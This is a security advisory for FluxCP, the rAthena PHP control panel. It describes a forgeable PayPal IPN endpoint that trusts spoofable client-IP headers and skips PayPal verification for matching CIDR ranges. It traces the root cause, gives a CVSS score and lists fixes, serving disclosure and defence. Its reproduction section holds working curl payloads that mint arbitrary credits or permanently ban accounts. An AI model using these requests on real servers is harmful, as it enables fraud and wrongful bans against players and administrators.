# FluxCP PayPal IPN Forgery (rAthena)

**CWE-346 · Unauthenticated IPN endpoint · Spoofable client-IP headers + verification-free CIDR gate → arbitrary credit minting and permanent account bans**

> **Vendor:** rathena (https://github.com/rathena)
> **Product:** FluxCP (custom PHP framework, https://github.com/rathena/FluxCP)
> **Affected version:** master branch, commit 98cd4b8 (2025-11-03), latest as of 2026-09-28; no official release version
> **Affected endpoints:** POST /?module=donate&action=notify (PayPal IPN handler)
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Validation used a local harness with stubbed game-server DB and lab account IDs only; no real payments or sensitive values appear in this disclosure.

## 1. Summary

FluxCP's PayPal IPN endpoint accepts any unauthenticated POST and decides whether the request comes from PayPal using a client IP read from **spoofable headers** (`X-Real-IP` first) and a gate whose CIDR branch **never performs PayPal verification**. The stock configuration ships the enabling CIDRs (`173.0.81.0/24`), so one spoofed header passes the gate with zero PayPal contact; the attacker then supplies `account_id`/`server_name` in the base64 `custom` parameter and mints arbitrary credits (`depositCredits()`, `mc_gross` taken at face value) or permanently bans any account (`payment_status=Reversed`).

## 2. Root Cause

| File | Line | Role |
|---|---|---|
| `modules/donate/notify.php` | 4-8 | Any unauthenticated POST → `Flux_PaymentNotifyRequest::process()` |
| `lib/Flux/PaymentNotifyRequest.php` | 112-133 | `fetchIP()` prefers `HTTP_X_REAL_IP` → `X_FORWARDED_FOR` → `CLIENT_IP` → `CF_CONNECTING_IP` over `REMOTE_ADDR` |
| `lib/Flux/PaymentNotifyRequest.php` | 139 | Gate: `(in_array($host, $allowed) && $this->verify()) \|\| $this->verifyiprange($host)` |
| `lib/Flux/PaymentNotifyRequest.php` | 449-473 | `verifyiprange()`: pure CIDR math, **never calls `verify()`** |
| `lib/Flux/PaymentNotifyRequest.php` | 158 | `@unserialize(base64_decode(custom))` — attacker-chosen `account_id` / `server_name` |
| `lib/Flux/PaymentNotifyRequest.php` | 248 | `depositCredits()` from attacker-set `mc_gross`, no validity gate |
| `lib/Flux/PaymentNotifyRequest.php` | 287-290 | `permanentlyBan()` on `BanPaymentStatuses` match |
| `config/application.php` | 109-124 | Stock `PayPalAllowedHosts` includes `173.0.81.0/24`, `173.0.80.0/20` |
| `config/application.php` | 103, 142-145 | Default `PayPalBusinessEmail` = `admin@localhost`; `BanPaymentStatuses` = Reversed / Cancelled_Reversal |

```php
// lib/Flux/PaymentNotifyRequest.php:139
if ((in_array($received_from, $allowed_hosts) && $this->verify()) || $this->verifyiprange($received_from)) {
```

## 3. Prerequisites

- No trusted reverse proxy stripping inbound `X-Real-IP`/`X-Forwarded-For` in front of FluxCP (FluxCP itself always trusts these headers).
- The endpoint is unauthenticated by design (real PayPal IPNs must reach it from the internet); enabling CIDR ships in the stock config; `receiver_email` default `admin@localhost` works out of the box, and the real business email is routinely public.

## 4. Reproduction

```bash
# 1) Mint credits into any account (custom = base64 of account_id/server_name payload)
curl -X POST 'http://target/?module=donate&action=notify' \
  -H 'X-Real-IP: 173.0.81.77' \
  --data 'receiver_email=admin@localhost&payment_status=Completed&txn_type=web_accept&txn_id=FAKE1&mc_gross=99999&mc_currency=USD&payer_email=attacker@evil.example&custom=YToyOntzOjEwOiJhY2NvdW50X2lkIjtpOjIwMDAwMDA7czoxMToic2VydmVyX25hbWUiO3M6NToiYWxpY2UiO30='

# 2) Permanently ban any account
curl -X POST 'http://target/?module=donate&action=notify' \
  -H 'X-Real-IP: 173.0.81.77' \
  --data 'receiver_email=admin@localhost&payment_status=Reversed&txn_type=web_accept&txn_id=FAKE2&mc_gross=10&mc_currency=USD&custom=<base64 payload with victim account_id>'
```

Scripted PoC: `poc/ipn_spoof.sh` (target source: `poc/TARGET-SOURCE.txt`). Raw verification transcripts: `evidence/FLUXCP-D2N1.txt`, `evidence/raw-paypal-log.txt`, `evidence/raw-stub-calls.txt`.

## 5. Confirmed Techniques

- Verified with the **unmodified** `lib/Flux/PaymentNotifyRequest.php` (commit 98cd4b8) in a minimal local harness (stubs only the rAthena DB layer; stock config verbatim).
- `X-Real-IP: 173.0.81.77`: gate passed solely via `verifyiprange()` — log shows `Proceeding to validate...` with **no** `Establishing connection to PayPal server` line (`verify()` never invoked, `txnIsValid` false).
- `depositCredits(accountID=2000000, credits=99999.0)` recorded from forged Completed IPN; `permanentlyBan(accountID=2000001, ...)` recorded from forged Reversed IPN.
- `X-Forwarded-For` honored identically (500 credits).
- Negative controls clean: no header and `X-Real-IP: 8.8.8.8` → `Transaction invalid, aborting.`

## 6. Impact

Unauthenticated remote attackers forge PayPal IPNs to mint arbitrary donation credits into any account (real-money-equivalent fraud in the server economy) and to permanently ban any account, including staff. Integrity impact high; availability impact limited to targeted account-level denial.

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L` (Base 8.8 — High)

## 8. Remediation

1. Derive peer identity from `REMOTE_ADDR` only unless an explicitly configured trusted-proxy chain exists.
2. Require `verify()` on every gate path, including CIDR matches.
3. Persist verified transactions keyed by `txn_id`; derive credited amounts from those records, not from a single unverified POST.
4. Stop `unserialize()`-ing `custom`; use a strict typed schema.

## 9. References

- Project: https://github.com/rathena/FluxCP
- CWE-346: https://cwe.mitre.org/data/definitions/346.html
- External disclosure: https://gist.github.com/qianqiusujiu/e6d62836a90a4b8e2c0fde7539b1a448
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
